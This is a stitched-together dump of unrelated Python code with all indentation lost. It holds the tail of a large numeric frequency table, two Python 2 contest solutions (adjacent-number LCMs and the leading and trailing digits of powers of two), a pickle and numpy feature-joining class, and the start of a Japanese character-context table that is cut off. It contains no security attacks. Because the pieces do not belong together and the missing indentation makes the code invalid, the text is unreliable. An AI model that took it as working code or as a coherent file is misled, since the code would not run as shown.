6335,4697,3979,4144,6336,3980,4698,6337,6338,6339,6340,6341,4699,4700,4701,6342,
6343,4702,6344,6345,4703,6346,6347,4704,6348,4705,4706,3135,6349,4707,6350,4708,
6351,4377,6352,4709,3734,4145,6353,2506,4710,3189,6354,3050,4711,3981,6355,3547,
3014,4146,4378,3735,2651,3845,3260,3136,2224,1986,6356,3401,6357,4712,2594,3627,
3137,2573,3736,3982,4713,3628,4714,4715,2682,3629,4716,6358,3630,4379,3631,6359,
6360,6361,3983,6362,6363,6364,6365,4147,3846,4717,6366,6367,3737,2842,6368,4718,
2628,6369,3261,6370,2386,6371,6372,3738,3984,4719,3464,4720,3402,6373,2924,3336,
4148,2866,6374,2805,3262,4380,2704,2069,2531,3138,2806,2984,6375,2769,6376,4721,
4722,3403,6377,6378,3548,6379,6380,2705,3092,1979,4149,2629,3337,2889,6381,3338,
4150,2557,3339,4381,6382,3190,3263,3739,6383,4151,4723,4152,2558,2574,3404,3191,
6384,6385,4153,6386,4724,4382,6387,6388,4383,6389,6390,4154,6391,4725,3985,6392,
3847,4155,6393,6394,6395,6396,6397,3465,6398,4384,6399,6400,6401,6402,6403,6404,
4156,6405,6406,6407,6408,2123,6409,6410,2326,3192,4726,6411,6412,6413,6414,4385,
4157,6415,6416,4158,6417,3093,3848,6418,3986,6419,6420,3849,6421,6422,6423,4159,
6424,6425,4160,6426,3740,6427,6428,6429,6430,3987,6431,4727,6432,2238,6433,6434,
4386,3988,6435,6436,3632,6437,6438,2843,6439,6440,6441,6442,3633,6443,2958,6444,
6445,3466,6446,2364,4387,3850,6447,4388,2959,3340,6448,3851,6449,4728,6450,6451,
3264,4729,6452,3193,6453,4389,4390,2706,3341,4730,6454,3139,6455,3194,6456,3051,
2124,3852,1602,4391,4161,3853,1158,3854,4162,3989,4392,3990,4731,4732,4393,2040,
4163,4394,3265,6457,2807,3467,3855,6458,6459,6460,3991,3468,4733,4734,6461,3140,
2960,6462,4735,6463,6464,6465,6466,4736,4737,4738,4739,6467,6468,4164,2403,3856,
6469,6470,2770,2844,6471,4740,6472,6473,6474,6475,6476,6477,6478,3195,6479,4741,
4395,6480,2867,6481,4742,2808,6482,2493,4165,6483,6484,6485,6486,2295,4743,6487,
6488,6489,3634,6490,6491,6492,6493,6494,6495,6496,2985,4744,6497,6498,4745,6499,
6500,2925,3141,4166,6501,6502,4746,6503,6504,4747,6505,6506,6507,2890,6508,6509,
6510,6511,6512,6513,6514,6515,6516,6517,6518,6519,3469,4167,6520,6521,6522,4748,
4396,3741,4397,4749,4398,3342,2125,4750,6523,4751,4752,4753,3052,6524,2961,4168,
6525,4754,6526,4755,4399,2926,4169,6527,3857,6528,4400,4170,6529,4171,6530,6531,
2595,6532,6533,6534,6535,3635,6536,6537,6538,6539,6540,6541,6542,4756,6543,6544,
6545,6546,6547,6548,4401,6549,6550,6551,6552,4402,3405,4757,4403,6553,6554,6555,
4172,3742,6556,6557,6558,3992,3636,6559,6560,3053,2726,6561,3549,4173,3054,4404,
6562,6563,3993,4405,3266,3550,2809,4406,6564,6565,6566,4758,4759,6567,3743,6568,
4760,3744,4761,3470,6569,6570,6571,4407,6572,3745,4174,6573,4175,2810,4176,3196,
4762,6574,4177,6575,6576,2494,2891,3551,6577,6578,3471,6579,4408,6580,3015,3197,
6581,3343,2532,3994,3858,6582,3094,3406,4409,6583,2892,4178,4763,4410,3016,4411,
6584,3995,3142,3017,2683,6585,4179,6586,6587,4764,4412,6588,6589,4413,6590,2986,
6591,2962,3552,6592,2963,3472,6593,6594,4180,4765,6595,6596,2225,3267,4414,6597,
3407,3637,4766,6598,6599,3198,6600,4415,6601,3859,3199,6602,3473,4767,2811,4416,
1856,3268,3200,2575,3996,3997,3201,4417,6603,3095,2927,6604,3143,6605,2268,6606,
3998,3860,3096,2771,6607,6608,3638,2495,4768,6609,3861,6610,3269,2745,4769,4181,
3553,6611,2845,3270,6612,6613,6614,3862,6615,6616,4770,4771,6617,3474,3999,4418,
4419,6618,3639,3344,6619,4772,4182,6620,2126,6621,6622,6623,4420,4773,6624,3018,
6625,4774,3554,6626,4183,2025,3746,6627,4184,2707,6628,4421,4422,3097,1775,4185,
3555,6629,6630,2868,6631,6632,4423,6633,6634,4424,2414,2533,2928,6635,4186,2387,
6636,4775,6637,4187,6638,1891,4425,3202,3203,6639,6640,4776,6641,3345,6642,6643,
3640,6644,3475,3346,3641,4000,6645,3144,6646,3098,2812,4188,3642,3204,6647,3863,
3476,6648,3864,6649,4426,4001,6650,6651,6652,2576,6653,4189,4777,6654,6655,6656,
2846,6657,3477,3205,4002,6658,4003,6659,3347,2252,6660,6661,6662,4778,6663,6664,
6665,6666,6667,6668,6669,4779,4780,2048,6670,3478,3099,6671,3556,3747,4004,6672,
6673,6674,3145,4005,3748,6675,6676,6677,6678,6679,3408,6680,6681,6682,6683,3206,
3207,6684,6685,4781,4427,6686,4782,4783,4784,6687,6688,6689,4190,6690,6691,3479,
6692,2746,6693,4428,6694,6695,6696,6697,6698,6699,4785,6700,6701,3208,2727,6702,
3146,6703,6704,3409,2196,6705,4429,6706,6707,6708,2534,1996,6709,6710,6711,2747,
6712,6713,6714,4786,3643,6715,4430,4431,6716,3557,6717,4432,4433,6718,6719,6720,
6721,3749,6722,4006,4787,6723,6724,3644,4788,4434,6725,6726,4789,2772,6727,6728,
6729,6730,6731,2708,3865,2813,4435,6732,6733,4790,4791,3480,6734,6735,6736,6737,
4436,3348,6738,3410,4007,6739,6740,4008,6741,6742,4792,3411,4191,6743,6744,6745,
6746,6747,3866,6748,3750,6749,6750,6751,6752,6753,6754,6755,3867,6756,4009,6757,
4793,4794,6758,2814,2987,6759,6760,6761,4437,6762,6763,6764,6765,3645,6766,6767,
3481,4192,6768,3751,6769,6770,2174,6771,3868,3752,6772,6773,6774,4193,4795,4438,
3558,4796,4439,6775,4797,6776,6777,4798,6778,4799,3559,4800,6779,6780,6781,3482,
6782,2893,6783,6784,4194,4801,4010,6785,6786,4440,6787,4011,6788,6789,6790,6791,
6792,6793,4802,6794,6795,6796,4012,6797,6798,6799,6800,3349,4803,3483,6801,4804,
4195,6802,4013,6803,6804,4196,6805,4014,4015,6806,2847,3271,2848,6807,3484,6808,
6809,6810,4441,6811,4442,4197,4443,3272,4805,6812,3412,4016,1579,6813,6814,4017,
6815,3869,6816,2964,6817,4806,6818,6819,4018,3646,6820,6821,4807,4019,4020,6822,
6823,3560,6824,6825,4021,4444,6826,4198,6827,6828,4445,6829,6830,4199,4808,6831,
6832,6833,3870,3019,2458,6834,3753,3413,3350,6835,4809,3871,4810,3561,4446,6836,
6837,4447,4811,4812,6838,2459,4448,6839,4449,6840,6841,4022,3872,6842,4813,4814,
6843,6844,4815,4200,4201,4202,6845,4023,6846,6847,4450,3562,3873,6848,6849,4816,
4817,6850,4451,4818,2139,6851,3563,6852,6853,3351,6854,6855,3352,4024,2709,3414,
4203,4452,6856,4204,6857,6858,3874,3875,6859,6860,4819,6861,6862,6863,6864,4453,
3647,6865,6866,4820,6867,6868,6869,6870,4454,6871,2869,6872,6873,4821,6874,3754,
6875,4822,4205,6876,6877,6878,3648,4206,4455,6879,4823,6880,4824,3876,6881,3055,
4207,6882,3415,6883,6884,6885,4208,4209,6886,4210,3353,6887,3354,3564,3209,3485,
2652,6888,2728,6889,3210,3755,6890,4025,4456,6891,4825,6892,6893,6894,6895,4211,
6896,6897,6898,4826,6899,6900,4212,6901,4827,6902,2773,3565,6903,4828,6904,6905,
6906,6907,3649,3650,6908,2849,3566,6909,3567,3100,6910,6911,6912,6913,6914,6915,
4026,6916,3355,4829,3056,4457,3756,6917,3651,6918,4213,3652,2870,6919,4458,6920,
2438,6921,6922,3757,2774,4830,6923,3356,4831,4832,6924,4833,4459,3653,2507,6925,
4834,2535,6926,6927,3273,4027,3147,6928,3568,6929,6930,6931,4460,6932,3877,4461,
2729,3654,6933,6934,6935,6936,2175,4835,2630,4214,4028,4462,4836,4215,6937,3148,
4216,4463,4837,4838,4217,6938,6939,2850,4839,6940,4464,6941,6942,6943,4840,6944,
4218,3274,4465,6945,6946,2710,6947,4841,4466,6948,6949,2894,6950,6951,4842,6952,
4219,3057,2871,6953,6954,6955,6956,4467,6957,2711,6958,6959,6960,3275,3101,4843,
6961,3357,3569,6962,4844,6963,6964,4468,4845,3570,6965,3102,4846,3758,6966,4847,
3878,4848,4849,4029,6967,2929,3879,4850,4851,6968,6969,1733,6970,4220,6971,6972,
6973,6974,6975,6976,4852,6977,6978,6979,6980,6981,6982,3759,6983,6984,6985,3486,
3487,6986,3488,3416,6987,6988,6989,6990,6991,6992,6993,6994,6995,6996,6997,4853,
6998,6999,4030,7000,7001,3211,7002,7003,4221,7004,7005,3571,4031,7006,3572,7007,
2614,4854,2577,7008,7009,2965,3655,3656,4855,2775,3489,3880,4222,4856,3881,4032,
3882,3657,2730,3490,4857,7010,3149,7011,4469,4858,2496,3491,4859,2283,7012,7013,
7014,2365,4860,4470,7015,7016,3760,7017,7018,4223,1917,7019,7020,7021,4471,7022,
2776,4472,7023,7024,7025,7026,4033,7027,3573,4224,4861,4034,4862,7028,7029,1929,
3883,4035,7030,4473,3058,7031,2536,3761,3884,7032,4036,7033,2966,2895,1968,4474,
3276,4225,3417,3492,4226,2105,7034,7035,1754,2596,3762,4227,4863,4475,3763,4864,
3764,2615,2777,3103,3765,3658,3418,4865,2296,3766,2815,7036,7037,7038,3574,2872,
3277,4476,7039,4037,4477,7040,7041,4038,7042,7043,7044,7045,7046,7047,2537,7048,
7049,7050,7051,7052,7053,7054,4478,7055,7056,3767,3659,4228,3575,7057,7058,4229,
7059,7060,7061,3660,7062,3212,7063,3885,4039,2460,7064,7065,7066,7067,7068,7069,
7070,7071,7072,7073,7074,4866,3768,4867,7075,7076,7077,7078,4868,3358,3278,2653,
7079,7080,4479,3886,7081,7082,4869,7083,7084,7085,7086,7087,7088,2538,7089,7090,
7091,4040,3150,3769,4870,4041,2896,3359,4230,2930,7092,3279,7093,2967,4480,3213,
4481,3661,7094,7095,7096,7097,7098,7099,7100,7101,7102,2461,3770,7103,7104,4231,
3151,7105,7106,7107,4042,3662,7108,7109,4871,3663,4872,4043,3059,7110,7111,7112,
3493,2988,7113,4873,7114,7115,7116,3771,4874,7117,7118,4232,4875,7119,3576,2336,
4876,7120,4233,3419,4044,4877,4878,4482,4483,4879,4484,4234,7121,3772,4880,1045,
3280,3664,4881,4882,7122,7123,7124,7125,4883,7126,2778,7127,4485,4486,7128,4884,
3214,3887,7129,7130,3215,7131,4885,4045,7132,7133,4046,7134,7135,7136,7137,7138,
7139,7140,7141,7142,7143,4235,7144,4886,7145,7146,7147,4887,7148,7149,7150,4487,
4047,4488,7151,7152,4888,4048,2989,3888,7153,3665,7154,4049,7155,7156,7157,7158,
7159,7160,2931,4889,4890,4489,7161,2631,3889,4236,2779,7162,7163,4891,7164,3060,
7165,1672,4892,7166,4893,4237,3281,4894,7167,7168,3666,7169,3494,7170,7171,4050,
7172,7173,3104,3360,3420,4490,4051,2684,4052,7174,4053,7175,7176,7177,2253,4054,
7178,7179,4895,7180,3152,3890,3153,4491,3216,7181,7182,7183,2968,4238,4492,4055,
7184,2990,7185,2479,7186,7187,4493,7188,7189,7190,7191,7192,4896,7193,4897,2969,
4494,4898,7194,3495,7195,7196,4899,4495,7197,3105,2731,7198,4900,7199,7200,7201,
4056,7202,3361,7203,7204,4496,4901,4902,7205,4497,7206,7207,2315,4903,7208,4904,
7209,4905,2851,7210,7211,3577,7212,3578,4906,7213,4057,3667,4907,7214,4058,2354,
3891,2376,3217,3773,7215,7216,7217,7218,7219,4498,7220,4908,3282,2685,7221,3496,
4909,2632,3154,4910,7222,2337,7223,4911,7224,7225,7226,4912,4913,3283,4239,4499,
7227,2816,7228,7229,7230,7231,7232,7233,7234,4914,4500,4501,7235,7236,7237,2686,
7238,4915,7239,2897,4502,7240,4503,7241,2516,7242,4504,3362,3218,7243,7244,7245,
4916,7246,7247,4505,3363,7248,7249,7250,7251,3774,4506,7252,7253,4917,7254,7255,
3284,2991,4918,4919,3219,3892,4920,3106,3497,4921,7256,7257,7258,4922,7259,4923,
3364,4507,4508,4059,7260,4240,3498,7261,7262,4924,7263,2992,3893,4060,3220,7264,
7265,7266,7267,7268,7269,4509,3775,7270,2817,7271,4061,4925,4510,3776,7272,4241,
4511,3285,7273,7274,3499,7275,7276,7277,4062,4512,4926,7278,3107,3894,7279,7280,
4927,7281,4513,7282,7283,3668,7284,7285,4242,4514,4243,7286,2058,4515,4928,4929,
4516,7287,3286,4244,7288,4517,7289,7290,7291,3669,7292,7293,4930,4931,4932,2355,
4933,7294,2633,4518,7295,4245,7296,7297,4519,7298,7299,4520,4521,4934,7300,4246,
4522,7301,7302,7303,3579,7304,4247,4935,7305,4936,7306,7307,7308,7309,3777,7310,
4523,7311,7312,7313,4248,3580,7314,4524,3778,4249,7315,3581,7316,3287,7317,3221,
7318,4937,7319,7320,7321,7322,7323,7324,4938,4939,7325,4525,7326,7327,7328,4063,
7329,7330,4940,7331,7332,4941,7333,4526,7334,3500,2780,1741,4942,2026,1742,7335,
7336,3582,4527,2388,7337,7338,7339,4528,7340,4250,4943,7341,7342,7343,4944,7344,
7345,7346,3020,7347,4945,7348,7349,7350,7351,3895,7352,3896,4064,3897,7353,7354,
7355,4251,7356,7357,3898,7358,3779,7359,3780,3288,7360,7361,4529,7362,4946,4530,
2027,7363,3899,4531,4947,3222,3583,7364,4948,7365,7366,7367,7368,4949,3501,4950,
3781,4951,4532,7369,2517,4952,4252,4953,3155,7370,4954,4955,4253,2518,4533,7371,
7372,2712,4254,7373,7374,7375,3670,4956,3671,7376,2389,3502,4065,7377,2338,7378,
7379,7380,7381,3061,7382,4957,7383,7384,7385,7386,4958,4534,7387,7388,2993,7389,
3062,7390,4959,7391,7392,7393,4960,3108,4961,7394,4535,7395,4962,3421,4536,7396,
4963,7397,4964,1857,7398,4965,7399,7400,2176,3584,4966,7401,7402,3422,4537,3900,
3585,7403,3782,7404,2852,7405,7406,7407,4538,3783,2654,3423,4967,4539,7408,3784,
3586,2853,4540,4541,7409,3901,7410,3902,7411,7412,3785,3109,2327,3903,7413,7414,
2970,4066,2932,7415,7416,7417,3904,3672,3424,7418,4542,4543,4544,7419,4968,7420,
7421,4255,7422,7423,7424,7425,7426,4067,7427,3673,3365,4545,7428,3110,2559,3674,
7429,7430,3156,7431,7432,3503,7433,3425,4546,7434,3063,2873,7435,3223,4969,4547,
4548,2898,4256,4068,7436,4069,3587,3786,2933,3787,4257,4970,4971,3788,7437,4972,
3064,7438,4549,7439,7440,7441,7442,7443,4973,3905,7444,2874,7445,7446,7447,7448,
3021,7449,4550,3906,3588,4974,7450,7451,3789,3675,7452,2578,7453,4070,7454,7455,
7456,4258,3676,7457,4975,7458,4976,4259,3790,3504,2634,4977,3677,4551,4260,7459,
7460,7461,7462,3907,4261,4978,7463,7464,7465,7466,4979,4980,7467,7468,2213,4262,
7469,7470,7471,3678,4981,7472,2439,7473,4263,3224,3289,7474,3908,2415,4982,7475,
4264,7476,4983,2655,7477,7478,2732,4552,2854,2875,7479,7480,4265,7481,4553,4984,
7482,7483,4266,7484,3679,3366,3680,2818,2781,2782,3367,3589,4554,3065,7485,4071,
2899,7486,7487,3157,2462,4072,4555,4073,4985,4986,3111,4267,2687,3368,4556,4074,
3791,4268,7488,3909,2783,7489,2656,1962,3158,4557,4987,1963,3159,3160,7490,3112,
4988,4989,3022,4990,4991,3792,2855,7491,7492,2971,4558,7493,7494,4992,7495,7496,
7497,7498,4993,7499,3426,4559,4994,7500,3681,4560,4269,4270,3910,7501,4075,4995,
4271,7502,7503,4076,7504,4996,7505,3225,4997,4272,4077,2819,3023,7506,7507,2733,
4561,7508,4562,7509,3369,3793,7510,3590,2508,7511,7512,4273,3113,2994,2616,7513,
7514,7515,7516,7517,7518,2820,3911,4078,2748,7519,7520,4563,4998,7521,7522,7523,
7524,4999,4274,7525,4564,3682,2239,4079,4565,7526,7527,7528,7529,5000,7530,7531,
5001,4275,3794,7532,7533,7534,3066,5002,4566,3161,7535,7536,4080,7537,3162,7538,
7539,4567,7540,7541,7542,7543,7544,7545,5003,7546,4568,7547,7548,7549,7550,7551,
7552,7553,7554,7555,7556,5004,7557,7558,7559,5005,7560,3795,7561,4569,7562,7563,
7564,2821,3796,4276,4277,4081,7565,2876,7566,5006,7567,7568,2900,7569,3797,3912,
7570,7571,7572,4278,7573,7574,7575,5007,7576,7577,5008,7578,7579,4279,2934,7580,
7581,5009,7582,4570,7583,4280,7584,7585,7586,4571,4572,3913,7587,4573,3505,7588,
5010,7589,7590,7591,7592,3798,4574,7593,7594,5011,7595,4281,7596,7597,7598,4282,
5012,7599,7600,5013,3163,7601,5014,7602,3914,7603,7604,2734,4575,4576,4577,7605,
7606,7607,7608,7609,3506,5015,4578,7610,4082,7611,2822,2901,2579,3683,3024,4579,
3507,7612,4580,7613,3226,3799,5016,7614,7615,7616,7617,7618,7619,7620,2995,3290,
7621,4083,7622,5017,7623,7624,7625,7626,7627,4581,3915,7628,3291,7629,5018,7630,
7631,7632,7633,4084,7634,7635,3427,3800,7636,7637,4582,7638,5019,4583,5020,7639,
3916,7640,3801,5021,4584,4283,7641,7642,3428,3591,2269,7643,2617,7644,4585,3592,
7645,4586,2902,7646,7647,3227,5022,7648,4587,7649,4284,7650,7651,7652,4588,2284,
7653,5023,7654,7655,7656,4589,5024,3802,7657,7658,5025,3508,4590,7659,7660,7661,
1969,5026,7662,7663,3684,1821,2688,7664,2028,2509,4285,7665,2823,1841,7666,2689,
3114,7667,3917,4085,2160,5027,5028,2972,7668,5029,7669,7670,7671,3593,4086,7672,
4591,4087,5030,3803,7673,7674,7675,7676,7677,7678,7679,4286,2366,4592,4593,3067,
2328,7680,7681,4594,3594,3918,2029,4287,7682,5031,3919,3370,4288,4595,2856,7683,
3509,7684,7685,5032,5033,7686,7687,3804,2784,7688,7689,7690,7691,3371,7692,7693,
2877,5034,7694,7695,3920,4289,4088,7696,7697,7698,5035,7699,5036,4290,5037,5038,
5039,7700,7701,7702,5040,5041,3228,7703,1760,7704,5042,3229,4596,2106,4089,7705,
4597,2824,5043,2107,3372,7706,4291,4090,5044,7707,4091,7708,5045,3025,3805,4598,
4292,4293,4294,3373,7709,4599,7710,5046,7711,7712,5047,5048,3806,7713,7714,7715,
5049,7716,7717,7718,7719,4600,5050,7720,7721,7722,5051,7723,4295,3429,7724,7725,
7726,7727,3921,7728,3292,5052,4092,7729,7730,7731,7732,7733,7734,7735,5053,5054,
7736,7737,7738,7739,3922,3685,7740,7741,7742,7743,2635,5055,7744,5056,4601,7745,
7746,2560,7747,7748,7749,7750,3923,7751,7752,7753,7754,7755,4296,2903,7756,7757,
7758,7759,7760,3924,7761,5057,4297,7762,7763,5058,4298,7764,4093,7765,7766,5059,
3925,7767,7768,7769,7770,7771,7772,7773,7774,7775,7776,3595,7777,4299,5060,4094,
7778,3293,5061,7779,7780,4300,7781,7782,4602,7783,3596,7784,7785,3430,2367,7786,
3164,5062,5063,4301,7787,7788,4095,5064,5065,7789,3374,3115,7790,7791,7792,7793,
7794,7795,7796,3597,4603,7797,7798,3686,3116,3807,5066,7799,7800,5067,7801,7802,
4604,4302,5068,4303,4096,7803,7804,3294,7805,7806,5069,4605,2690,7807,3026,7808,
7809,7810,7811,7812,7813,7814,7815,7816,7817,7818,7819,7820,7821,7822,7823,7824,
7825,7826,7827,7828,7829,7830,7831,7832,7833,7834,7835,7836,7837,7838,7839,7840,
7841,7842,7843,7844,7845,7846,7847,7848,7849,7850,7851,7852,7853,7854,7855,7856,
7857,7858,7859,7860,7861,7862,7863,7864,7865,7866,7867,7868,7869,7870,7871,7872,
7873,7874,7875,7876,7877,7878,7879,7880,7881,7882,7883,7884,7885,7886,7887,7888,
7889,7890,7891,7892,7893,7894,7895,7896,7897,7898,7899,7900,7901,7902,7903,7904,
7905,7906,7907,7908,7909,7910,7911,7912,7913,7914,7915,7916,7917,7918,7919,7920,
7921,7922,7923,7924,3926,7925,7926,7927,7928,7929,7930,7931,7932,7933,7934,7935,
7936,7937,7938,7939,7940,7941,7942,7943,7944,7945,7946,7947,7948,7949,7950,7951,
7952,7953,7954,7955,7956,7957,7958,7959,7960,7961,7962,7963,7964,7965,7966,7967,
7968,7969,7970,7971,7972,7973,7974,7975,7976,7977,7978,7979,7980,7981,7982,7983,
7984,7985,7986,7987,7988,7989,7990,7991,7992,7993,7994,7995,7996,7997,7998,7999,
8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8010,8011,8012,8013,8014,8015,
8016,8017,8018,8019,8020,8021,8022,8023,8024,8025,8026,8027,8028,8029,8030,8031,
8032,8033,8034,8035,8036,8037,8038,8039,8040,8041,8042,8043,8044,8045,8046,8047,
8048,8049,8050,8051,8052,8053,8054,8055,8056,8057,8058,8059,8060,8061,8062,8063,
8064,8065,8066,8067,8068,8069,8070,8071,8072,8073,8074,8075,8076,8077,8078,8079,
8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,
8096,8097,8098,8099,8100,8101,8102,8103,8104,8105,8106,8107,8108,8109,8110,8111,
8112,8113,8114,8115,8116,8117,8118,8119,8120,8121,8122,8123,8124,8125,8126,8127,
8128,8129,8130,8131,8132,8133,8134,8135,8136,8137,8138,8139,8140,8141,8142,8143,
8144,8145,8146,8147,8148,8149,8150,8151,8152,8153,8154,8155,8156,8157,8158,8159,
8160,8161,8162,8163,8164,8165,8166,8167,8168,8169,8170,8171,8172,8173,8174,8175,
8176,8177,8178,8179,8180,8181,8182,8183,8184,8185,8186,8187,8188,8189,8190,8191,
8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8203,8204,8205,8206,8207,
8208,8209,8210,8211,8212,8213,8214,8215,8216,8217,8218,8219,8220,8221,8222,8223,
8224,8225,8226,8227,8228,8229,8230,8231,8232,8233,8234,8235,8236,8237,8238,8239,
8240,8241,8242,8243,8244,8245,8246,8247,8248,8249,8250,8251,8252,8253,8254,8255,
8256,8257,8258,8259,8260,8261,8262,8263,8264,8265,8266,8267,8268,8269,8270,8271)
class Solution(object):
def solve(self, cipher):
A = cipher
B = []
B.append(A[0])
for i in xrange(1, len(A)):
B.append(A[i] * A[i - 1] / self.gcd(A[i], A[i - 1]))
B.append(A[-1])
return " ".join(map(str, B))
def gcd(self, a, b):
while b:
a, b = b, a % b
return a
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
N = int(f.readline().strip())
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (Solution().solve(cipher))
print s,
import pickle
import numpy as np
import os.path
import numpy.matlib as mat
class Join_Ftr(object):
def Join_feature(self, fl1, fl2):
ftr1 = pickle.load(fl1)
ftr2 = pickle.load(fl2)
row, col = ftr1.shape
jnt_ftr = np.empty([5, col * 2])
for i in range(5):
jnt_ftr[i] = np.append(ftr1[i], ftr2[i])
return jnt_ftr
def Constrct_XY(self, feature_pth, X_info):
X = []
Y = []
for i in range(len(X_info)):
pth1 = os.path.join(feature_pth, X_info[i][0])
pth2 = os.path.join(feature_pth, X_info[i][1])
if os.path.exists(pth1) and os.path.exists(pth2):
fl1 = open(pth1, 'r')
fl2 = open(pth2, 'r')
X.append(self.Join_feature(fl1, fl2))
Y.append(X_info[i][2])
fl1.close()
fl2.close()
return X, Y
def XY_in(self, X, Y):
assert len(X) == len(Y), "the number of the image pair and their corresponding y is not equal"
num_of_pair = len(X)
num_of_patch = X[0].shape[0]
n_ftr = X[0].shape[1]
X_in = mat.zeros([num_of_pair * num_of_patch * 2, n_ftr])
Y_in = mat.zeros([num_of_pair * num_of_patch * 2, 1])
num = 0
for i in range(num_of_pair):
img_pair = X[i]
for j in range(num_of_patch):
X_in[num] = img_pair[j]
Y_in[num] = Y[i]
num = num + 1
X_in[num, 0:n_ftr / 2] = img_pair[j][n_ftr / 2:]
X_in[num, n_ftr / 2:] = img_pair[j][0:n_ftr / 2]
Y_in[num] = Y[i]
num = num + 1
return X_in, Y_in
import math
from decimal import *
class Solution(object):
def __init__(self):
getcontext().prec = 28
def solve(self, cipher):
N, K = cipher
LSB = pow(2, N - 1, 10 ** K)
MSB = int(str(self.get_MSB(2, N - 1) * 10 ** K)[:K])
return MSB + LSB
def get_MSB(self, b, n):
p = Decimal(n) * Decimal(b).log10()
f = Decimal(p) - Decimal(math.floor(p))
return Decimal(10) ** f
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (solution.solve(cipher))
print s,
from .compat import wrap_ord
NUM_OF_CATEGORY = 6
DONT_KNOW = -1
ENOUGH_REL_THRESHOLD = 100
MAX_REL_THRESHOLD = 1000
MINIMUM_DATA_THRESHOLD = 4
jp2CharContext = (
(0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1),
(2,4,0,4,0,3,0,4,0,3,4,4,4,2,4,3,3,4,3,2,3,3,4,2,3,3,3,2,4,1,4,3,3,1,5,4,3,4,3,4,3,5,3,0,3,5,4,2,0,3,1,0,3,3,0,3,3,0,1,1,0,4,3,0,3,3,0,4,0,2,0,3,5,5,5,5,4,0,4,1,0,3,4),
(0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2),
(0,4,0,5,0,5,0,4,0,4,5,4,4,3,5,3,5,1,5,3,4,3,4,4,3,4,3,3,4,3,5,4,4,3,5,5,3,5,5,5,3,5,5,3,4,5,5,3,1,3,2,0,3,4,0,4,2,0,4,2,1,5,3,2,3,5,0,4,0,2,0,5,4,4,5,4,5,0,4,0,0,4,4),
(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),
(0,3,0,4,0,3,0,3,0,4,5,4,3,3,3,3,4,3,5,4,4,3,5,4,4,3,4,3,4,4,4,4,5,3,4,4,3,4,5,5,4,5,5,1,4,5,4,3,0,3,3,1,3,3,0,4,4,0,3,3,1,5,3,3,3,5,0,4,0,3,0,4,4,3,4,3,3,0,4,1,1,3,4),
(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),
(0,4,0,3,0,3,0,4,0,3,4,4,3,2,2,1,2,1,3,1,3,3,3,3,3,4,3,1,3,3,5,3,3,0,4,3,0,5,4,3,3,5,4,4,3,4,4,5,0,1,2,0,1,2,0,2,2,0,1,0,0,5,2,2,1,4,0,3,0,1,0,4,4,3,5,4,3,0,2,1,0,4,3),
(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),
(0,3,0,5,0,4,0,2,1,4,4,2,4,1,4,2,4,2,4,3,3,3,4,3,3,3,3,1,4,2,3,3,3,1,4,4,1,1,1,4,3,3,2,0,2,4,3,2,0,3,3,0,3,1,1,0,0,0,3,3,0,4,2,2,3,4,0,4,0,3,0,4,4,5,3,4,4,0,3,0,0,1,4),
(1,4,0,4,0,4,0,4,0,3,5,4,4,3,4,3,5,4,3,3,4,3,5,4,4,4,4,3,4,2,4,3,3,1,5,4,3,2,4,5,4,5,5,4,4,5,4,4,0,3,2,2,3,3,0,4,3,1,3,2,1,4,3,3,4,5,0,3,0,2,0,4,5,5,4,5,4,0,4,0,0,5,4),
(0,5,0,5,0,4,0,3,0,4,4,3,4,3,3,3,4,0,4,4,4,3,4,3,4,3,3,1,4,2,4,3,4,0,5,4,1,4,5,4,4,5,3,2,4,3,4,3,2,4,1,3,3,3,2,3,2,0,4,3,3,4,3,3,3,4,0,4,0,3,0,4,5,4,4,4,3,0,4,1,0,1,3),
(0,3,1,4,0,3,0,2,0,3,4,4,3,1,4,2,3,3,4,3,4,3,4,3,4,4,3,2,3,1,5,4,4,1,4,4,3,5,4,4,3,5,5,4,3,4,4,3,1,2,3,1,2,2,0,3,2,0,3,1,0,5,3,3,3,4,3,3,3,3,4,4,4,4,5,4,2,0,3,3,2,4,3),
(0,2,0,3,0,1,0,1,0,0,3,2,0,0,2,0,1,0,2,1,3,3,3,1,2,3,1,0,1,0,4,2,1,1,3,3,0,4,3,3,1,4,3,3,0,3,3,2,0,0,0,0,1,0,0,2,0,0,0,0,0,4,1,0,2,3,2,2,2,1,3,3,3,4,4,3,2,0,3,1,0,3,3),
